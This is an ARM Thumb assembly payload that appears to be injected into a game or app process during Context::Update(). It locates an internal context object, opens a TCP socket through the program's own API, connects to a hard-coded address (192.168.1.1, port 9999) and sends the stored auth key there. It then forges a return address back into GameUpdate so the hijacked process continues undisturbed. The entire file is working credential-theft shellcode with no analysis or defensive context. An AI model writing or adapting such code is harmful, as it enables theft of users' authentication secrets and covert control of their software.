.section .text
.thumb
.global start

start:
	@ sp + 104 is beginning of stack frame of previous function - Context::Update()
	ldr		r4, [sp, #84]	@ at sp + 84 r5 register is stored, which contain address of Context
	add		r4, #252		@ NotificationCtx is a member of Context, 252 - offset of it
	sub		sp, #300
	ldr		r0, [r4, #0]	@ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr		r5, [r3, #48]	@ load socket() function
	movs	r1, #1
	blx		r5				@ call socket(true)
	mov		r7, r0

	ldr     r0, [r4, #0]    @ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr     r5, [r3, #64]   @ load connect()
	mov		r1, r7			@ socket
	ldr		r6, =0x0101A8C0	@ r6 = ip address
	str		r6, [sp, #0]	@ store ip to NetAddr
	ldr		r6, =9999		@ r6 = port
	strh	r6, [sp, #4]	@ store port to NetAddr
	mov		r2, sp
	blx		r5

	ldr     r0, [r4, #0]    @ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr     r5, [r3, #56]   @ load send()
	mov		r1, r7			@ socket
	ldr     r6, [r4, #24]   @ load auth key
	str		r6, [sp, #0]	@ store auth key on stack
	mov		r2, sp
	mov		r3, #4
	@ 4th argument is ignored in case of tcp socket
	blx		r5

	ldr     r0, [r4, #0]    @ load api
	ldr		r3, [r0, #0]	@ load api vtable
	ldr     r5, [r3, #84]   @ load close()
	mov     r1, r7          @ socket
	blx		r5

	add		sp, #300
	sub 	r4, #252 		@ restore previous this - addres of Context

	ldr		r5, [sp, #88]	@ at sp + 88 r6 register is stored, which contain address of GameUpdate+1
	ldr		r6, =0x5f2		@ GameUpdate - (Context::Update() + offset), 11f0 - (be8 + 0x16)
	sub		r5, r6			@ restored return address
	mov 	pc, r5
